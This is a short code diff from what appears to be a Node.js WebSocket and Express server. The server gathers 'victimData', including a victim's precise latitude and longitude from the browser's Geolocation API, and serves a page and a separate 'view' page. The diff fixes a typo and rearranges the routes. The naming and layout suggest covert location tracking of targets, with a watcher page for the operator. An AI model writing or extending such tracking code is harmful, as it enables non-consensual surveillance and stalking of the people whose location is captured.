@@ -25,7 +25,7 @@ wss.on('connection', ws => {
 
             // Получение точного местоположения через HTML5 Geolocation API
             if (data.latitude && data.longitude) {
-                victimData. preciseLocation = {
+                victimData.preciseLocation = {
                     latitude: data.latitude,
                     longitude: data.longitude
                 };
@@ -47,12 +47,12 @@ wss.on('connection', ws => {
     });
 });
 
-app.get('/view', (req, res) => {
-    res.sendFile(path.join(__dirname, 'view.html'));
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-app.get('/stream', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+app.get('/view', (req, res) => {
+    res.sendFile(path.join(__dirname, 'view.html'));
 });
 
 server.listen(3000, () => {
